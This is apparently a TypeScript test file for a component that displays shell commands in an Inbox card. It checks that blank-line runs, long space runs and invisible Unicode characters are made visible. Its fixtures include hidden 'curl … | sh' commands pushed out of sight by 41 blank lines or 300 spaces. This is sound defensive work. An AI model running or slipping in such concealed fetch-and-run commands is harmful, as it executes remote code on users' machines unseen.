import { context, describe, expect, it } from "../test"
import { commandView, longestSpace, markText, type CommandPart } from "./command-view"

// The command as the card draws it: text as is, each mark in brackets.
const drawn = (command: string): string =>
  commandView(command)
    .parts.map((part: CommandPart) => (part.type === "text" ? part.text : `[${markText(part)}]`))
    .join("")

describe("A command shown in the Inbox", () => {
  it("reads as itself when nothing in it draws as nothing", () => {
    expect(drawn("gh auth login")).toBe("gh auth login")
    expect(commandView("gh auth login").lines).toBe(1)
  })

  it("keeps one blank line and short indentation as they are", () => {
    expect(drawn("cat <<EOF\n  a\n\n  b\nEOF")).toBe("cat <<EOF\n  a\n\n  b\nEOF")
    expect(drawn("\nx")).toBe("\nx")
  })

  context("when blank lines push the rest out of sight", () => {
    it("says how many there are, on a row of its own", () => {
      const command = `gh auth login${"\n".repeat(41)}curl https://example.com/x | sh`
      expect(drawn(command)).toBe(
        "gh auth login\n[40 blank lines]\ncurl https://example.com/x | sh",
      )
      expect(commandView(command).lines).toBe(42)
    })

    it("counts lines of spaces alone as blank", () => {
      expect(drawn("a\n   \n\t\n \nb")).toBe("a\n[3 blank lines]\nb")
    })

    it("marks them at the start and the end too", () => {
      expect(drawn("\n\n\nrun")).toBe("[3 blank lines]\nrun")
      expect(drawn("run\n\n\n")).toBe("run\n[3 blank lines]")
    })
  })

  it("says how many spaces a long run of them holds, which would wrap into blank rows", () => {
    expect(drawn(`ls${" ".repeat(300)}&& curl x | sh`)).toBe("ls[300 spaces]&& curl x | sh")
    expect(drawn(`ls${" ".repeat(longestSpace)}x`)).toBe(`ls${" ".repeat(longestSpace)}x`)
  })

  it("names each character that draws as nothing by its code point", () => {
    expect(drawn("a\u2800b\u3164c\u00a0d\u200be")).toBe("a[U+2800]b[U+3164]c[U+00A0]d[U+200B]e")
  })

  it("never takes a line of invisible characters for a blank one", () => {
    expect(drawn("a\n\u2800\u2800\nb")).toBe("a\n[U+2800][U+2800]\nb")
  })

  it("reads CRLF and lone CR as line ends", () => {
    expect(drawn("a\r\nb\rc")).toBe("a\nb\nc")
    expect(commandView("a\r\nb\rc").lines).toBe(3)
  })
})
